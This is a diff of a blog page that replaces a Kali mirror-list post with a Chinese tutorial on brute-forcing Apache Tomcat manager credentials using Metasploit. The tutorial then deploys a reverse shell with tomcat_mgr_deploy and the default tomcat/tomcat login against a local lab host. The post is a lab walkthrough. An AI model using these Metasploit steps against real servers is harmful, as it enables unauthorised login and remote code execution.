@@ -52,7 +52,7 @@
 
     
       
-        <article id="post-kali更新源 2018.7月" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+        <article id="post-mest-tomcat" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
 
   <div class="article-inner">
     
@@ -60,7 +60,7 @@
         
   
     <h2 itemprop="name">
-      <a class="article-title" href="/2018/07/27/kali更新源 2018.7月/">kali更新源 2018.7月</a>
+      <a class="article-title" href="/2018/09/16/mest-tomcat/">Metasploit爆破Tomcat弱口令</a>
     </h2>
   
 
@@ -69,8 +69,8 @@
 
     
       <div class="article-meta">
-        <a href="/2018/07/27/kali更新源 2018.7月/" class="article-date">
-  <time datetime="2018-07-27T13:57:35.000Z" itemprop="datePublished">2018-07-27</time>
+        <a href="/2018/09/16/mest-tomcat/" class="article-date">
+  <time datetime="2018-09-16T12:33:09.000Z" itemprop="datePublished">2018-09-16</time>
 </a>
         
       </div>
@@ -82,19 +82,60 @@
       
 
       
-        <h1 id="kali更新源-2018-7月"><a href="#kali更新源-2018-7月" class="headerlink" title="kali更新源 2018.7月"></a>kali更新源 2018.7月</h1><p>输入leafpad /etc/apt/sources.list</p>
-<p>复制下面内容，粘贴即可</p>
-<p>#阿里云</p>
-<p>deb <a href="http://mirrors.aliyun.com/kali" target="_blank" rel="noopener">http://mirrors.aliyun.com/kali</a> kali-rolling main non-free contrib<br>deb-src <a href="http://mirrors.aliyun.com/kali" target="_blank" rel="noopener">http://mirrors.aliyun.com/kali</a> kali-rolling main non-free contrib </p>
-<p>#清华大学<br>deb <a href="http://mirrors.tuna.tsinghua.edu.cn/kali" target="_blank" rel="noopener">http://mirrors.tuna.tsinghua.edu.cn/kali</a> kali-rolling main contrib non-free<br>deb-src <a href="https://mirrors.tuna.tsinghua.edu.cn/kali" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/kali</a> kali-rolling main contrib non-free </p>
-<p>#浙江大学<br>deb <a href="http://mirrors.zju.edu.cn/kali" target="_blank" rel="noopener">http://mirrors.zju.edu.cn/kali</a> kali-rolling main contrib non-free </p>
-<p>deb-src <a href="http://mirrors.zju.edu.cn/kali" target="_blank" rel="noopener">http://mirrors.zju.edu.cn/kali</a> kali-rolling main contrib non-free </p>
-<p>原文地址：<a href="https://blog.csdn.net/xfyangle/article/details/81055093" target="_blank" rel="noopener">https://blog.csdn.net/xfyangle/article/details/81055093</a> </p>
+        <h2 id="Metasploit爆破Tomcat弱口令"><a href="#Metasploit爆破Tomcat弱口令" class="headerlink" title="Metasploit爆破Tomcat弱口令"></a>Metasploit爆破Tomcat弱口令</h2><p><img src="http://pic.netbian.com/uploads/allimg/190413/202741-15551584619a4b.jpg" alt></p>
+<h2 id="0x00-tomcat-爆破"><a href="#0x00-tomcat-爆破" class="headerlink" title="0x00 tomcat 爆破"></a>0x00 tomcat 爆破</h2><ol>
+<li>nmap  扫描主机       【依然本地搭建的】执行命令 nmap –sV  192.168.6.16</li>
+</ol>
+<p><img src="http://imglf5.nosdn.127.net/img/d0pJMFNGSnJ5LzRxQnd1NXg5bXlJSzMwRTZTdTZvMmxVd0J2VklUUE8zREFRN2tjQU1TbGZ3PT0.png?imageView" alt></p>
+<p>可以发现8080端口开着tomcat</p>
+<ol start="2">
+<li>kali终端中输入命令“msfconsole”，启动MSF终端。</li>
+</ol>
+<p><img src="http://imglf3.nosdn.127.net/img/d0pJMFNGSnJ5LzRxNFRhKzl3TWlxUHBvQUJtblBVWXA4WE5uUWdiYkxHTURNQ2pEdHRMSnpRPT0.png?imageView" alt></p>
+<ol start="3">
+<li>在msf终端下输入命令“search tomcat”, 搜索tomcat的相关工具和攻击载荷</li>
+</ol>
+<p><img src="http://imglf3.nosdn.127.net/img/d0pJMFNGSnJ5LzY0cnBxZEJ4MG52L3BXZzZHa2lRY3grazRFYlZpSjc4bXB1dHJ2NzQrNGFnPT0.png?imageView" alt></p>
+<ol start="4">
+<li><p>在终端输入“use auxiliary/scanner/http/tomcat_mgr_login”， 启用漏洞利用模块, 提示符就会提示进入到该路径下</p>
+<p><img src="http://imglf3.nosdn.127.net/img/d0pJMFNGSnJ5LzVMUGtKSHVyb3NPcmVidmZlZEJZSk5NSVh6Y1NMNXhPaEF2NHArSWw0aE53PT0.png?imageView" alt></p>
+</li>
+<li><p>在终端输入“show options ” 查看需要配置的参数</p>
+<p><img src="http://imglf6.nosdn.127.net/img/d0pJMFNGSnJ5LzQvajBhOFJ3bHZEZno3blhvZmtHaUpwenlXZWVnVTRJVjdpYkpqL0JjWklRPT0.png?imageView" alt></p>
+</li>
+<li><p>终端下输入“set RHOSTS 192.168.6.16”,设置攻击目标主机IP</p>
+<p>终端下输入“set RPORT 8180”,设置攻击目标主机端口号</p>
+</li>
+</ol>
+<p><img src="http://imglf4.nosdn.127.net/img/d0pJMFNGSnJ5LzUzQk8rOUR2MU9yZTdYdWtTaGQwSWZMRmxCWHpQM3FmbEp3WWhFaC91SkZ3PT0.png?imageView" alt></p>
+<ol start="7">
+<li><p>终端下输入“exploit”, 实施攻击</p>
+<p><img src="http://imglf5.nosdn.127.net/img/d0pJMFNGSnJ5LzRkbms5Z3drdDFDMXd0YkdEOEsrYUUwdXFkWWlYZzF0ZWt6ZEd0bEc5QUpnPT0.png?imageView" alt></p>
+</li>
+</ol>
+<p>账户密码都是tomcat</p>
+<ul>
+<li>0x01 反弹shell,建立会话</li>
+</ul>
+<ol>
+<li>终端下输入“use exploit/multi/http/tomcat_mgr_deploy”</li>
+</ol>
+<p><img src="http://imglf4.nosdn.127.net/img/d0pJMFNGSnJ5LzRZMENyeG9OOVdZZlpnMk1xR0Uxem5SNzVUNmF6VzRiRVpCVkluM1M4N1FnPT0.png?imageView" alt></p>
+<ol start="2">
+<li><p>终端下输入“set RHOST 192.168.6.16”,设置攻击的目标主机IP<br>终端下输入“set RPORT 8080”,设置攻击目标主机端口号</p>
+<p><img src="http://imglf5.nosdn.127.net/img/d0pJMFNGSnJ5LzV5UHh4SzdZMGcwTWpCYisvTUdXSkUvMzNBZmtJUGNZdkdib21yblZhMlJnPT0.png?imageView" alt></p>
+</li>
+<li><p>终端下输入“set username tomcat”,设置攻击时使用的登录账号tomcat<br>终端下输入“set password tomcat”,设置攻击时使用的密码tomcat</p>
+<p><img src="http://imglf3.nosdn.127.net/img/d0pJMFNGSnJ5LzZlV3hSdVZnNzRmWXY3ZkhJWGxYdmtjSllXVG14Q1lCSkcrazlNM2lPTFlRPT0.png?imageView" alt></p>
+</li>
+<li><p>run 开始攻击</p>
+</li>
+</ol>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://lilifengcode.github.io/2018/07/27/kali更新源 2018.7月/" data-id="cjvunvmy70009ugpx9njjxfko" class="article-share-link">分享</a>
+      <a data-url="http://lilifengcode.github.io/2018/09/16/mest-tomcat/" data-id="cjvzbsph20008qgpxsm4hwnjs" class="article-share-link">分享</a>
       
     </footer>
 
@@ -114,7 +155,7 @@
   
     <nav class="page-nav">
       
-      <a class="extend prev" rel="prev" href="/page/16/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/15/">15</a><a class="page-number" href="/page/16/">16</a><span class="page-number current">17</span><a class="page-number" href="/page/18/">18</a><a class="page-number" href="/page/19/">19</a><span class="space">&hellip;</span><a class="page-number" href="/page/21/">21</a><a class="extend next" rel="next" href="/page/18/">下一页</a>
+      <a class="extend prev" rel="prev" href="/page/16/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/15/">15</a><a class="page-number" href="/page/16/">16</a><span class="page-number current">17</span><a class="page-number" href="/page/18/">18</a><a class="page-number" href="/page/19/">19</a><span class="space">&hellip;</span><a class="page-number" href="/page/22/">22</a><a class="extend next" rel="next" href="/page/18/">下一页</a>
     </nav>
   
 </section>
